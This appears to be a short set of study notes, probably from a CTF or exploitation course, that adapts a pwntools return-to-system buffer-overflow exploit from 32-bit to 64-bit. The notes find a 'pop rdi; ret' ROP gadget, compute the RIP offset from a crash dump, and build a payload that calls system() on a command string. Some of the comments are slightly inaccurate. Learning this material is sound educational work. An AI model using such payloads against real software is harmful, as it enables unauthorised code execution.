Differences from 32 to 64

# Locate ROP gadget needed
pop_rdi_gadget = ROP(elf).find_gadget(["pop rdi","ret"])[0] # 64Bit needs the argument for system to be in RDI

# Addresses
info("%#x pop rdi; ret;", pop_rdi_gadget) # Shows the requested gadget 

# Locate RIP value and offset
stack = core.rsp # Need to find what is before RIP\
pattern = core.read(stack,4) # Need to find what is before RIP and then add 4 to get RIP\
rip_offset = cyclic_find(pattern) # New find for 64Bit

# Build the payload
payload = flat({
    rip_offset: [pop_rdi_gadget,
    bincat_addr,
    elf.symbols.system
    ]
})
# Explained below
'''\
    eip_offset:         #Offset to cause overflow\
    [pop_rdi_gadget,    #POP RDI to pop something into RDI\
    bincat_addr,        #What is getting popped into rdi, command we want to run\
    elf.symbols.system  #Command to run's argument\
'''
